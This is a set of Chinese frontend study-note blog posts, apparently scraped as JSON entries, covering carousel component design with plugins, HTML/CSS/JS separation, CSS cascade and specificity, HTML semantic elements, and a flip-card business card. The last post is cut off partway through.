上篇文章通过一个深夜模式切换的示例，我们知道了写好 JS 的一些原则： 让 HTML、CSS 和 JS 职能分离。 应当避免不必要的由 JS 直接操作样式和 HTML。 用 CSS 类（或伪元素）来表示状态。 纯展示类交互可以寻求零 JS 方案。 这样不仅便于后续代码的维护扩展，而且可以做到代码简洁、可读性高。在开发过程中，写好 JS 还有两个重要的原则：组件封装、过程抽象。 UI 组件是指 Web 页面上抽出来一个个包含模版（HTML）、功能（JS）和样式（CSS）的单元。好的 UI 组件具备正确性、封装性、扩展性、复用性。 如何实现一个电商网站的轮播图？ HTML - 轮播图是一个典型的列表结构，我们可以使用无序列表 ul 元素来实现。 CSS - 使用绝对定位将图片重叠在同一个位置，添加 CSS 类表示轮播图切换的状态，轮播图的切换动画使用 CSS transition。 JS - API 设计应保证原子操作、职责单一、灵活性，并使用自定义事件 CustomEvent 来解耦控制流。 版本一 定义一个轮播图类，将各功能通过在类中定义一系列方法实现： getSelectedItem - 获取当前播放图片。 getSelectedItemIndex - 获取当前播放图片指针。 slideTo - 鼠标悬浮底部小圆点时，切换到指定位置图片。 slideNext - 切换到下一张图片。 slidePrevious - 切换到上一张图片。 start - 轮播图开始播放。 stop - 轮播图暂停播放。 constructor - 构造函数，在里面定义逻辑和绑定事件。 class Slider{ constructor(id, cycle = 3000){ } getSelectedItem(){ } getSelectedItemIndex(){ } slideTo(idx){ } slideNext(){ } slidePrevious(){ } start(){ } stop(){ } } const slider = new Slider('my-slider'); slider.start(); 这样就实现了轮播图的功能，但是类中的构造器实在是太臃肿了，做了很多本来不应该它要做的事，如果我们要改需求，比如去除底部小圆点的鼠标悬浮切换图片的功能，那我们要在构造函数里面查找这部分功能并删去相应的代码。 这样看来，我们只做到了封装性和正确性，但是缺乏扩展性和复用性，所以我们需要考虑插件化，将构造器进行简化，将各功能分离出来。 版本二 将控制元素抽取成插件，插件与组件之间通过依赖注入（将依赖对象传入插件初始化函数）的方式建立联系和解耦，这样就提高了组件的可扩展性。 首先将小圆点的控制抽离成一个插件 pluginController，插件接收的参数就是组件的实例，将控制流中的事件写在这里，插件中的逻辑就是之前构造函数中的逻辑。 function pluginController(slider) { const controller = slider.container.querySelector('.slide-list__control'); if (controller) { const buttons = controller.querySelectorAll('.slide-list__control-buttons, .slide-list__control-buttons--selected'); controller.addEventListener('mouseover', evt =&gt; { const idx = Array.from(buttons).indexOf(evt.target); if (idx &gt;= 0) { slider.slideTo(idx); slider.stop(); } }); controller.addEventListener('mouseout', evt =&gt; { slider.start(); }); slider.addEventListener('slide', evt =&gt; { const idx = evt.detail.index const selected = controller.querySelector('.slide-list__control-buttons--selected'); if (selected) selected.className = 'slide-list__control-buttons'; buttons[idx].className = 'slide-list__control-buttons--selected'; }); } } 然后，将上一张图片按钮控制抽离成一个插件 pluginPrevious。 function pluginPrevious(slider) { const previous = slider.container.querySelector('.slide-list__previous'); if (previous) { previous.addEventListener('click', evt =&gt; { slider.stop(); slider.slidePrevious(); slider.start(); evt.preventDefault(); }); } } 然后，将下一张图片按钮控制抽离成一个插件 pluginPrevious。 function pluginNext(slider) { const next = slider.container.querySelector('.slide-list__next'); if (next) { next.addEventListener('click', evt =&gt; { slider.stop(); slider.slideNext(); slider.start(); evt.preventDefault(); }); } } 最后，在轮播图类中定义一个注册插件的方法。 registerPlugins(...plugins) { plugins.forEach(plugin =&gt; plugin(this)); } 这样，我们就可以通过注册插件 registerPlugins 来使用各种插件，如果我们要去除底部小圆点的鼠标悬浮切换图片的功能，只需要调用 registerPlugins 方法时，不将 pluginController 传入即可。 const slider = new Slider('my-slider'); slider.registerPlugins(/*pluginController, */pluginPrevious, pluginNext); slider.start(); 但是这里有了新的问题，下方小圆点虽然失效了，但是在页面上并没有消失，要将小圆点也去除就要手动去操作 HTML，所以我们需要解耦 HTML。 版本三 将 HTML 模板化，也就是让 JavaScript 来渲染组件的 HTML，这样更易于扩展。 将 HTML 解耦后，我们只需要一个轮播图容器标签即可。 &lt;div id=&quot;my-slider&quot; class=&quot;slider-list&quot;&gt;&lt;/div&gt; 首先，在轮播图类中定义 render() 渲染方法，根据图片列表返回一段包含 ul 列表元素的 HTML 代码。 render() { const images = this.options.images; const content = images.map(image =&gt; ` &lt;li class=&quot;slider-list__item&quot;&gt; &lt;img src=&quot;${image}&quot;/&gt; &lt;/li&gt; `.trim()); return `&lt;ul&gt;${content.join('')}&lt;/ul&gt;`; } 然后，在轮播图类中定义一个注册插件的方法。 registerPlugins(...plugins) { plugins.forEach(plugin =&gt; { const pluginContainer = document.createElement('div'); pluginContainer.className = '.slider-list__plugin'; pluginContainer.innerHTML = plugin.render(this.options.images); this.container.appendChild(pluginContainer); plugin.action(this); }); } 然后，定义各个插件，插件中也要定义 render() 渲染方法，用来返回该插件对应的 HTML 代码，action() 方法用来定义插件逻辑。 const pluginController = { render(images) { return ` &lt;div class=&quot;slide-list__control&quot;&gt; ${images.map((image, i) =&gt; ` &lt;span class=&quot;slide-list__control-buttons${i===0?'--selected':''}&quot;&gt;&lt;/span&gt; `).join('')} &lt;/div&gt; `.trim(); }, action(slider) { const controller = slider.container.querySelector('.slide-list__control'); if (controller) { const buttons = controller.querySelectorAll('.slide-list__control-buttons, .slide-list__control-buttons--selected'); controller.addEventListener('mouseover', evt =&gt; { const idx = Array.from(buttons).indexOf(evt.target); if (idx &gt;= 0) { slider.slideTo(idx); slider.stop(); } }); controller.addEventListener('mouseout', evt =&gt; { slider.start(); }); slider.addEventListener('slide', evt =&gt; { const idx = evt.detail.index const selected = controller.querySelector('.slide-list__control-buttons--selected'); if (selected) selected.className = 'slide-list__control-buttons'; buttons[idx].className = 'slide-list__control-buttons--selected'; }); } } }; const pluginPrevious = { render() { return `&lt;a class=&quot;slide-list__previous&quot;&gt;&lt;/a&gt;`; }, action(slider) { const previous = slider.container.querySelector('.slide-list__previous'); if (previous) { previous.addEventListener('click', evt =&gt; { slider.stop(); slider.slidePrevious(); slider.start(); evt.preventDefault(); }); } } }; const pluginNext = { render() { return `&lt;a class=&quot;slide-list__next&quot;&gt;&lt;/a&gt;`; }, action(slider) { const previous = slider.container.querySelector('.slide-list__next'); if (previous) { previous.addEventListener('click', evt =&gt; { slider.stop(); slider.slideNext(); slider.start(); evt.preventDefault(); }); } } }; 最后，定义轮播图的构造函数，跟前面的构造函数不同的是，第二个参数是一个对象。由于轮播图内部 HTML 需要由 JavaScript 来渲染，所以需要手动先调用 this.slideTo(0) 渲染第一张图片。 constructor(id, opts = { images: [], cycle: 3000 }) { this.container = document.getElementById(id); this.options = opts; this.container.innerHTML = this.render(); this.items = this.container.querySelectorAll('.slider-list__item, .slider-list__item--selected'); this.cycle = opts.cycle || 3000; this.slideTo(0); } 这样，我们就可以通过注册插件 registerPlugins 来使用各种插件，如果我们要去除底部小圆点的鼠标悬浮切换图片的功能，只需要调用 registerPlugins 方法时，不将 pluginController 传入即可，同时底部小圆点也会在页面中去除。 const slider = new Slider('my-slider', { images: ['https://p5.ssl.qhimg.com/t0119c74624763dd070.png', 'https://p4.ssl.qhimg.com/t01adbe3351db853eb3.jpg', 'https://p2.ssl.qhimg.com/t01645cd5ba0c3b60cb.jpg', 'https://p4.ssl.qhimg.com/t01331ac159b58f5478.jpg' ], cycle: 3000 }); slider.registerPlugins(/*pluginController, */pluginPrevious, pluginNext); slider.start(); 至此，扩展性有了，但是可复用性还不够，我们继续重构，将组件抽象成一个组件框架，提高组件的复用性。 版本四 将通用的组件模型抽象出来，定义成一个通用组件类，这样我们如果有多个组件，就可以在各个组件中继承和复用这个组件模型。 class Component{ constructor(id, opts = {name, data:[]}){ this.container = document.getElementById(id); this.options = opts; this.container.innerHTML = this.render(opts.data); } registerPlugins(...plugins){ plugins.forEach(plugin =&gt; { const pluginContainer = document.createElement('div'); pluginContainer.className = `${this.options.name}__plugin`; pluginContainer.innerHTML = plugin.render(this.options.data); this.container.appendChild(pluginContainer); plugin.action(this); }); } render(data) { /* 抽象方法 */ return '' } } class Slider extends Component{ constructor(id, opts = {name: 'slider-list', data:[], cycle: 3000}){ super(id, opts); this.items = this.container.querySelectorAll('.slider-list__item, .slider-list__item--selected'); this.cycle = opts.cycle || 3000; this.slideTo(0); } } 其他实现和版本三相同，这样我们就实现了一个小型的组件框架（还可以解耦 CSS）。、 总结 实现一个组件的步骤：结构设计、展现效果、行为设计。 组件设计的原则：正确性、封装性、扩展性、复用性。 组件重构的原则：插件化（扩展性）、模板化（易于扩展）、抽象化（复用性）。 ","link":"https://zkrisj.github.io/post/xie-hao-js-de-yuan-ze-zu-jian-feng-zhuang-guo-cheng-chou-xiang-or-qing-xun-ying-bi-ji/"},{"title":"HTML、CSS、JS 各司其职的原则 ｜ 青训营笔记","content":"介绍 我们知道，一个网页通常分为三层，JS 负责行为，CSS 负责表现，HTML 负责结构。在写页面时，遵循 HTML、CSS、JS 各司其职的原则，各自实现对应的功能，这样的好处不仅便于后续代码的维护扩展，而且可以做到代码简洁、可读性高。 示例 比如我们要实现一个深夜/白天模式切换的需求。点击&quot;太阳🌞&quot;图标时，切换为深夜模式，页面变成深色背景、浅色字体、图标变为&quot;月亮🌜&quot;。点击&quot;月亮🌜&quot;图标时，切换为白天模式，页面变成浅色背景、深色字体、图标变为&quot;太阳🌞&quot;。 版本一 我们在按钮上面绑定一个点击事件，根据按钮的 innerHTML 判断当前模式，然后设置 body.style，再设置按钮的 innerHTML。 btn.addEventListener('click', (e) =&gt; { const body = document.body; if(e.target.innerHTML === '🌞') { body.style.backgroundColor = 'black'; body.style.color = 'white'; e.target.innerHTML = '🌜'; } else { body.style.backgroundColor = 'white'; body.style.color = 'black'; e.target.innerHTML = '🌞'; } }); 这样效果虽然实现了，但我们思考以下几点： 对于不了解需求的人，阅读这段代码是否可以直接理解&quot;按钮&quot;点击的含义？ 使用了 JS 去修改页面的样式，也就是说 JS 做了 CSS 该做的事，如果再增加一个白底蓝字的模式，当 JS 代码很多的时候就变得维护困难。 版本二 按钮图标通过 CSS 伪元素 ::after 实现，同时增加一个 CSS night 类，设置 night 类对应的按钮图标，当切换到深夜模式时，将 night 类添加到 body 元素上，按钮图标也会对应的改变。 #modeBtn::after { content: '🌞'; } body.night { background: black; color: white; transition: 1s; } body.night #modeBtn::after { content: '🌜'; } const btn = document.getElementById('modeBtn'); btn.addEventListener('click', (e) =&gt; { const { body } = document; body.className = body.className ? '' : 'night'; }); 这样就遵循了 CSS、JS 各司其职的原则，使用 CSS 类表示元素的状态，JS 只负责切换元素的状态。 通过语义化的 CSS night 类，描述了这是一个夜间（night）模式的业务状态，便于快速了解业务需求和后续维护。 如果需求变更，修改模式的颜色，只需修改 body.night 的样式，避免了由 JS 操作 CSS。 按钮图标通过 CSS 伪元素 ::after 实现，按钮的文本内容就可以清除，避免了由 JS 操作 HTML。 JS 代码更简洁了。 但我们还要思考：对于这类纯展示类交互的需求，如果有零 JS 方案，那就会对我们以后的维护更加方便。 版本三 按钮图标通过 label 标签和 CSS 伪元素 ::after 实现，同时通过 input checkbox 元素的选中状态和 CSS 相邻兄弟选择器，切换深夜模式。 &lt;input id=&quot;modeCheckBox&quot; type=&quot;checkbox&quot;&gt; &lt;label id=&quot;modeBtn&quot; for=&quot;modeCheckBox&quot;&gt;&lt;/label&gt; &lt;div class=&quot;content&quot;&gt;...&lt;/div&gt; #modeCheckBox { display: none; } #modeCheckBox:checked + .content { background: black; color: white; transition: 1s; } #modeBtn::after { content: '🌞'; } #modeCheckBox:checked + .content #modeBtn::after { content: '🌜'; } 这样页面样式的更改在 HTML 的基础上完全依靠 CSS 实现，没有使用一行 JS 代码。 修改模式的颜色，只需修改按钮选中状态 #modeCheckBox:checked+.content 的样式； 修改按钮的图标，只需修改按钮的伪元素 ::after 的 content 属性即可。 总结 写好 JS 的一些原则： 让 HTML、CSS 和 JS 职能分离。 应当避免不必要的由 JS 直接操作样式和 HTML。 用 CSS 类（或伪元素）来表示状态。 纯展示类交互可以寻求零 JS 方案。 ","link":"https://zkrisj.github.io/post/htmlcssjs-ge-si-qi-zhi-de-yuan-ze-or-qing-xun-ying-bi-ji/"},{"title":"CSS 中的层叠、优先级和继承 ｜ 青训营笔记","content":"介绍 CSS 中的层叠、优先级和继承决定着如何将 CSS 应用到 HTML 中，以及如何解决冲突。在某些时候，我们在做一个项目过程中会发现一些应该产生效果的样式没有生效，通常的原因是你创建了两个应用于同一个元素的规则，而设计元素样式的规则可能不是期望的规则，因此需要了解这些机制是如何工作的。 层叠 是 CSS 的一个基本特征，它是一个定义了如何合并来自多个源的属性值的算法。简单地说，就是 CSS 规则的顺序。它在 CSS 处于核心地位，CSS 的全称层叠样式表正是强调了这一点。有三个因素需要考虑，根据重要性排序（递增）如下： 资源顺序 - 如果你有超过一条规则，而且都是相同的权重，那么最后面的规则会应用。 优先级 - 决定在发生冲突的时候应该使用哪条规则。例如有些规则在最后出现，但是却应用了前面的具有冲突的规则，这是因为前面的有更高的优先级——它范围更小。 重要程度 - 特殊的 CSS 规则 !important，用于修改特定属性的值，能够覆盖普通规则的层叠。 大多数 @规则的 CSS 声明是参与层叠计算的，比如包含于 @media、@documents 或者@supports 的 CSS 声明，但是包含于 @keyframes 和 @font-face 的声明不参与计算，因为它们是作为一个整体参与层叠算法的筛选。另外，@import 和 @charset 遵循特定的算法，不受层叠算法影响。 还可以使用 CSS @规则 中的 @layer 声明一个级联层，同一层内的规则将级联在一起，优先级的顺序由声明层的顺序来决定，这给予了开发者对层叠机制的更多控制。 优先级 优先级是基于不同种类选择器组成的匹配规则。浏览器是根据优先级来决定当多个规则有不同选择器对应相同的元素的时候需要使用哪个规则。 如果一个元素选择器不是很具体，例如选择页面上该类型的所有元素（或伪元素），则它的优先级就会低一些。 如果一个类选择器稍微具体点，例如选择该页面中有特定 class 属性值（或其他属性选择器）的元素，则它的优先级就要高一点。 如果一个类选择器更具体点，例如选择该页面中有特定 id 属性值的元素，则它的优先级就要更高一点。 给元素添加的内联样式 (例如，style=&quot;font-weight:bold&quot;) 总会覆盖外部样式表的任何样式，因此可看作是具有最高的优先级。 当在一个样式声明中使用一个 !important 规则时，将覆盖任何其他声明，与优先级无关。 下表列出了样式来源和其对应地重要程度（递增），例如 CSS 动画用 @keyframes @规则定义的值会覆盖全部普通值，但会被 !important 的值覆盖。 重要程度 来源 1 用户代理 2 用户 3 页面作者 4 CSS 动画 5 页面作者（!important） 6 用户（!important） 7 用户代理（!important） 8 css 过渡 (css transitions) 浏览器会有一个基本的样式表来给任何网页设置默认样式，称为用户代理样式。 网页的作者可以定义文档的样式，这是最常见的样式表。大多数情况下此类型样式表会定义多个，它们构成网站的视觉和体验，即主题。 读者，作为浏览器的用户，可以使用自定义样式表定制使用体验。 注意的是，原本级联水平高的声明应用了 !important 后，其优先级反而低，而原本级联水平低的声明应用了 !important 后，优先级反而高。 继承 每个CSS 属性定义的概述都指出了这个属性是默认继承的 (&quot;Inherited: Yes&quot;) 还是默认不继承的 (&quot;Inherited: no&quot;)。这决定了当你没有为元素的属性指定值时该如何计算值。 例如，你设置一个元素的 color 和 font-family，每个在里面的元素也都会有相同的属性，除非你直接在元素上设置属性。但是如果你在一个元素上设置 width 为 50% ，所有的后代元素则不会是父元素的宽度的 50% 。 尽管每个 CSS 属性页都列出了属性是否被继承，但我们通常可以通过常识来判断哪些属性属于默认继承。 inherit 关键字允许显式的声明继承性，它对继承和非继承属性都生效。 可以使用 all 简写属性一次控制所有属性的继承，该属性将其值应用于所有属性。 常见可继承属性有：字体系列属性、文本系列属性（color、text-align、letter-spacing 等）。 常见不可继承属性有：背景系列属性、盒子模型属性（display、max-width、width、height、margin 、outline、border、padding 等）、定位属性（float、clear、position、top、overflow、clip、z-index 等）。 总结 CSS 声明的优先级取决于定义它的样式表和级联层。 可以设置自定义样式表来覆盖开发人员定义的样式：例如用户可能视力受损，并想在所有网页上设置两倍的正常字体大小，以便更容易进行阅读。 可以使用新特性级联层：你可以让非分层样式（在任何层之外声明的 CSS 样式会被按声明的顺序组合在一起，形成一个未命名的层，它会被当作最后声明的层）覆盖分层样式，或者你可以让后面的层中声明的样式覆盖先前的层中声明的样式。例如，作为开发人员，你可能无法编辑第三方的样式表，但你可以将外部的样式表导入级联层中，以便你自己的样式可以轻松地覆盖导入的样式，无需担心第三方选择器的优先级。 ","link":"https://zkrisj.github.io/post/css-zhong-de-ceng-die-you-xian-ji-he-ji-cheng-or-qing-xun-ying-bi-ji/"},{"title":"HTML 中的语义元素 | 青训营笔记","content":"介绍 我们知道，HTML 被用来结构化信息——例如标题、段落和列表等，也可用来在一定程度上描述文档的外观和语义。在编程中，语义指的是一段代码的含义——例如 &quot;运行这行 JavaScript 代码会产生怎样的影响？&quot;, 或者 &quot;这个 HTML 的元素有什么作用，扮演了什么样的角色&quot;（而不只是 &quot;它看上去像是什么？&quot;）。 首先我们看一个使用 HTML5 语义元素定义的页面，可以看到通过语义元素，HTML 结构更加清晰了。 HTML 中的语义 语义 HTML 是使用 HTML 标记来加强网页和 Web 应用程序中信息的语义或意义，而不仅仅是定义其表示或外观。根据 W3C，语义网： “允许跨应用程序、企业和团体对数据进行分享和重用。” 好的语义化 HTML 也改善了网页文档的可访问性（参见网页内容无障碍指南）。例如，当屏幕阅读器或音频浏览器可以正确判定一个文档的结构时，视觉障碍用户不会再因阅读重复或无关的信息而浪费时间。 例如，&lt;h1&gt; 元素是一个语义化元素，赋予了它包裹着的文本“这个页面中最高级别标题功能“的角色 (或含义) 。 &lt;h1&gt;This is a top level heading&lt;/h1&gt; 默认情况下，绝大多数浏览器的代理样式将会赋予一个 &lt;h1&gt; 元素很大的字号尺寸从而使它看上去更像是一个标题（虽然你可以把它格式化为任何你想要的样式），但是更重要的是它的语义会被在很多地方以不同的方式被使用到，例如搜索引擎会把它包含的内容作为一个重要的关键词，从而影响这个页面在搜索结果中的排序（SEO），而且屏幕阅读器可以将其用作路标，以帮助视障用户浏览页面。此外，编写语义标记的其他一些好处如下： 查找有意义的标记比在 div 等标记中的没有语义或命名空间的样式类要容易得多 可以向开发人员建议将要填充的数据类型 语义命名反映了正确的自定义元素/组件 但是，你也可以通过样式（CSS）来让任何的元素看上去像是一个最高级别的标题： &lt;span style=&quot;font-size: 32px; margin: 21px 0;&quot;&gt;Is this a top level heading?&lt;/span&gt; 这将使它看起来像一个顶级标题，但它没有语义值，因此它不会获得如上所述的任何额外好处。 语义元素 语义元素清楚地向浏览器和开发者描述其意义。 非语义元素的例子：&lt;div&gt; 和 &lt;span&gt; - 无法提供关于其内容的信息。 语义元素的例子：&lt;form&gt;、&lt;table&gt;、&lt;img&gt; 等 - 清晰地定义其内容。 许多网站包含了指示导航、页眉、菜单、内容、文章以及页脚的 HTML 代码，例如这些：&lt;div id=&quot;nav&quot;&gt;、&lt;div class=&quot;header&quot;&gt;、&lt;div id=&quot;menu&quot;&gt;、&lt;div id=&quot;content&quot;&gt;、&lt;div id=&quot;post&quot;&gt;、&lt;div id=&quot;footer&quot;&gt;。而在 HTML5 中，提供了一系列新的语义元素来明确一个 Web 页面的不同部分，例如与以上 HTML 代码对应的元素分别为：&lt;nav&gt;、&lt;header&gt;、&lt;menu&gt;、&lt;section&gt;、&lt;article&gt;、&lt;footer&gt;。 下面介绍几个常见的语义元素。 &lt;address&gt; 元素 表示上下文的背景信息，可以是必要的任何一种联系方式，比如真实地址、URL、电子邮箱、电话号码、社交媒体账号、地理坐标等等。 虽然 &lt;address&gt; 元素看起来只是使用了 &lt;i&gt; 或者 &lt;em&gt; 元素的默认样式来渲染其中的文本，通常呈现为斜体，但是当处理联系信息时使用它更为合适，因为它表达了额外的语义信息。 当表示一个和联系信息无关的任意的地址时，请改用 &lt;p&gt; 元素而不是 &lt;address&gt; 元素。 这个元素不能包含除联系信息之外的任何信息，比如出版日期（这应当被包含在 &lt;time&gt; 元素之中）。 通常，&lt;address&gt; 元素可以放在 &lt;footer&gt; 元素之中（如果存在的话）。如果 &lt;address&gt; 元素位于 &lt;article&gt; 元素内，则它表示文章的联系信息。 大多数浏览器会在 &lt;address&gt; 元素前后添加折行。 &lt;article&gt; 元素 表示文档、页面、应用或网站中的独立结构，其意在成为可独立分配的或可复用的结构，如在发布中，它可能是论坛帖子、杂志或新闻文章、博客、用户提交的评论、交互式组件，或者其他独立的内容项目。 每个&lt;article&gt;，通常包括标题（&lt;h1&gt; - &lt;h6&gt; 元素）作为&lt;article&gt;元素的子元素。 当 &lt;article&gt; 元素嵌套使用时，则该元素代表与外层元素有关的文章。例如，代表博客评论的 &lt;article&gt; 元素可嵌套在代表博客文章的 &lt;article&gt; 元素中。 &lt;article&gt; 元素的作者信息可通过 &lt;address&gt; 元素提供，但是不适用于嵌套的 &lt;article&gt; 元素。 &lt;article&gt; 元素的发布日期和时间可通过 &lt;time&gt; 元素的 pubdate 属性表示。 可以使用 &lt;time&gt; 元素的 datetime 属性来描述 &lt;article&gt; 元素的发布日期和时间。 &lt;aside&gt; 元素 表示一个和其余页面内容几乎无关的部分，被认为是独立于该内容的一部分并且可以被单独的拆分出来而不会使整体受影响。其通常表现为侧边栏或者标注框（call-out boxes）。 &lt;aside&gt; 不能是 &lt;address&gt; 元素的后代。 不要把 &lt;aside&gt; 元素放在括号内要说明的文本，因为这种文本被认为是主要流内容的一部分。 &lt;footer&gt; 元素 表示最近一个章节内容或者根节点元素的页脚，通常包含该章节作者、版权数据或者与文档相关的链接等信息。 &lt;footer&gt; 元素内的作者信息应包含在 &lt;address&gt; 元素中。 &lt;footer&gt; 元素必须不能是 &lt;address&gt;、&lt;header&gt; 或者另一个 &lt;footer&gt; 元素的后代元素。 &lt;footer&gt; 元素不是分区内容，因此不能在页面大纲中引入新的分区。 &lt;header&gt; 元素 与全站的横幅标志作用具有相同的意义，除非嵌套在分区内容中。&lt;header&gt; 元素可以定义一个全局网站的标题，在可访问性树中被描述为一个横幅。它通常包括一个标志、公司名称、搜索功能，可能还有全局导航或一个 Logo，一般位于页面的顶部。 否则，它是可访问性树中的一个部分，通常包含周围部分的标题（h1-h6元素）和可选的副标题，但这不是必需的。 &lt;header&gt; 元素通常用于包含页面部分的标题（h1 至 h6 元素）。 &lt;header&gt; 元素必须不能是 &lt;address&gt;、&lt;footer&gt; 或者另一个 &lt;header&gt; 元素的后代元素。 &lt;header&gt; 元素不是分区内容，因此不能在页面大纲中引入新的分区。 &lt;main&gt; 元素 呈现了文档或应用的主体部分，与文档直接相关，或者扩展于文档的中心主题、应用的主要功能部分的内容组成。 &lt;main&gt; 与文档的大纲无关，不会影响 DOM 的页面结构，仅有提供信息的作用。 &lt;main&gt; 元素的内容应当是独一无二的，任何同时存在于任意一系列文档中的相同、重复内容，比如侧边栏、导航栏链接、版权信息、网站 Logo，搜索框（除非搜索框为文档的主要功能），都不应当被包含在其内。 浏览器的阅读器模式会寻找文档中的 &lt;main&gt; 元素，以及 标题元素和内容分区元素以便将内容转换至阅读器视图。 &lt;nav&gt; 元素 表示页面的一部分，其目的是在当前文档或其他文档中提供导航链接，例如菜单，目录和索引。 一个网页可能含有多个 &lt;nav&gt; 元素，例如一个是网站内的导航列表，另一个是本页面内的导航列表。 对于屏幕阅读障碍的人，可以使用这个元素来确定是否忽略初始内容。 &lt;section&gt; 元素 表示 HTML 文档中一个通用独立章节，一般来说会包含一个标题（在文档中，有独立的内容部分但没有标题来描述其内容，是没有任何意义的。标题对所有的读者都很有用，尤其是对使用屏幕阅读器等辅助技术的用户，同时标题也有利于搜索引擎优化）。一般来说，&lt;section&gt; 应该出现在文档大纲中。 &lt;section&gt; 元素不能是 &lt;address&gt; 元素的后代。 &lt;section&gt; 是一个通用的分节元素，只有在没有更具体的元素来代表它的时候才可以使用。例如一个搜索结果列表或地图显示及其控件并没有特定的元素，可以放在 &lt;section&gt; 里面。 当该元素的内容可以作为一个独立的作品在多个媒体上发表，使用 &lt;article&gt; 是一个更好的选择。 将该元素作为一个样式包装时，应使用 &lt;div&gt;。 总结 当要使用哪个标记时，先清楚哪个(或哪些)元素最适合。例如，它是一个数据列表吗？是有序的还是无序的？它是一篇带有章节和相关信息的文章吗？它列出了定义吗？它是一个需要标题的数字或图像吗？除了全局的页眉和页脚之外，它还应该有一个页眉和页脚吗？等等。 参考资料 Semantics in HTML ","link":"https://zkrisj.github.io/post/html-zhong-de-yu-yi-yuan-su-or-qing-xun-ying-bi-ji/"},{"title":"「青训营 X 码上掘金」制作一个翻转动效的个人名片","content":"介绍 名片（Business card），是一种载有关于公司或个人的联系信息的卡片，常用于商务往来场合之中，作为一种便利和记忆辅助工具的共享。名片通常包括：姓名、单位或商业机构名称（通常带有商标）、以及联系信息（如：街道地址、电话号码、传真号码、电子邮件地址及网站）。 名片是向人介绍自我的重要工具，作为一名程序员用代码做自我介绍是一件非常酷炫的事情。用代码制作一张名片最直观地介绍给别人的方式就是通过使用 HTML 绘制一个网页来显示了，下面我们就来制作一个翻转动效的个人名片。 实现 创建一个外部容器用来封装名片内部各个元素，一个内部容器用来实现翻转动效。 &lt;div class=&quot;flip-card&quot;&gt; &lt;div class=&quot;flip-card-inner&quot;&gt;&lt;/div&gt; &lt;/div&gt; 翻转动效需要使用 CSS transform、transform-style 属性和 rotateY 函数，rotateY 函数定义了一个 2D 转换，它可以让一个元素围绕纵坐标 (垂直轴) 旋转，transform-style 设置元素的子元素是位于 3D 空间中还是平面中。 .flip-card { width: 480px; height: 320px; margin-bottom: 1em; } .flip-card-inner { position: relative; width: 100%; height: 100%; transition: transform 0.6s; transform-style: preserve-3d; } .rotate { transform: rotateY(180deg); } 创建名片正面的元素。 &lt;div class=&quot;flip-card-front&quot;&gt; &lt;figure class=&quot;snip&quot;&gt; &lt;figcaption&gt; &lt;h2&gt;斯图尔特 &lt;span&gt;怀特&lt;/span&gt; &lt;/h2&gt; &lt;p&gt;我想如果我们不能嘲笑那些没有意义的事情，我们就无法对很多生活做出反应。&lt;/p&gt; &lt;div class=&quot;icons&quot;&gt; &lt;a href=&quot;#&quot;&gt; &lt;i class=&quot;ion-ios-home&quot;&gt;&lt;/i&gt; &lt;/a&gt; &lt;a href=&quot;#&quot;&gt; &lt;i class=&quot;ion-ios-email&quot;&gt;&lt;/i&gt; &lt;/a&gt; &lt;a href=&quot;#&quot;&gt; &lt;i class=&quot;ion-ios-telephone&quot;&gt;&lt;/i&gt; &lt;/a&gt; &lt;/div&gt; &lt;/figcaption&gt; &lt;img src=&quot;https://i.328888.xyz/2023/01/15/2wXwF.jpeg&quot;&gt; &lt;div class=&quot;position&quot;&gt;网站设计者&lt;/div&gt; &lt;/figure&gt; &lt;/div&gt; 由于要使用网络字体和图标，所以要通过链接引入（也可以使用 link 元素）。 @import url(https://fonts.googleapis.com/css?family=Raleway:400,200,300,800); @import url(https://code.ionicframework.com/ionicons/2.0.1/css/ionicons.min.css); body { font-family: 'Raleway', Arial, sans-serif; background-color: #212121; } 创建名片背面的元素。 &lt;div class=&quot;flip-card-back&quot; style=&quot;--img: url(https://i.328888.xyz/2023/01/15/2wXwF.jpeg)&quot;&gt; &lt;h2&gt;电话：123&lt;/h2&gt; &lt;h2&gt;邮箱：123@qq.com&lt;/h2&gt; &lt;h2&gt;地址：浙江省·杭州市&lt;/h2&gt; &lt;h2&gt;网址：https://zkrisj.gitee.io&lt;/h2&gt; &lt;/div&gt; 背面是个人信息的详细资料，背景设置为正面图片+径向渐变，由于字体颜色容易被背景色光线干扰，所以加了一个 background-blend-mode CSS 属性，它用来定义该元素的背景图片与背景色如何混合。 .flip-card-front, .flip-card-back { position: absolute; width: 100%; height: 100%; backface-visibility: hidden; z-index: 1; } .flip-card-front { background-color: #bbb; } .flip-card-back { background: var(--img) 0 / 100% 100%, radial-gradient(#e4d8fb, #3F51B5); background-blend-mode: darken; color: white; transform: rotateY(180deg); display: grid; } .flip-card-back h2 { margin-left: 1em; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; } figure.snip { position: relative; overflow: hidden; margin: auto; width: 480px; height: 320px; background: #ffffff; color: #000000; } figure.snip * { box-sizing: border-box; } figure.snip&gt;img { width: 50%; border-radius: 50%; border: 4px solid #ffffff; transition: all 0.35s ease-in-out; transform: scale(1.6); position: relative; float: right; right: -15%; } figure.snip figcaption { padding: 20px 30px 20px 20px; position: absolute; left: 0; width: 50%; } figure.snip figcaption h2, figure.snip figcaption p { margin: 0; text-align: left; padding: 10px 0; width: 100%; } figure.snip figcaption h2 { font-size: 1.3em; font-weight: 300; text-transform: uppercase; border-bottom: 1px solid rgba(0, 0, 0, 0.2); } figure.snip figcaption h2 span { font-weight: 800; } figure.snip figcaption p { font-size: 0.9em; opacity: 0.8; } figure.snip figcaption .icons { width: 100%; text-align: left; } figure.snip figcaption .icons i { font-size: 28px; padding: 5px; top: 50%; color: #000000; } figure.snip figcaption a { opacity: 0.3; transition: opacity 0.35s; } figure.snip figcaption a:hover { opacity: 0.8; } figure.snip .position { position: absolute; bottom: 0; width: 100%; text-align: left; padding: 15px 30px; font-size: 0.9em; opacity: 1; font-style: italic; color: #ffffff; background: #000000; clear: both; } 绑定点击事件，当点击正面图片时，名片将翻转到背面，而点击背面背景时切换回正面。 for (const f of document.querySelectorAll('.flip-card-inner')) { f.querySelectorAll('img, .flip-card-back').forEach(v =&gt; v.onclick = e =&gt; { f.classList.toggle('rotate'); }); } 完整代码+码上掘金 ","link":"https://zkrisj.github.io/post/qing-xun-ying-x-ma-shang-jue-jin-zhi-zuo-yi-ge-fan-zhuan-dong-xiao-de-ge-ren-ming-pian/"},{"title":"「兔了个兔」纯 CSS 制作兔子、气球动画","content":"介绍 Hello，掘友们好！又是一年新春之际，祝福大家兔年快乐！下面我们使用纯 CSS 制作一个兔子、气球动画，效果为：一个圆形框内有只兔子，当我们在光标悬停在圆形框内或通过键盘 Tab 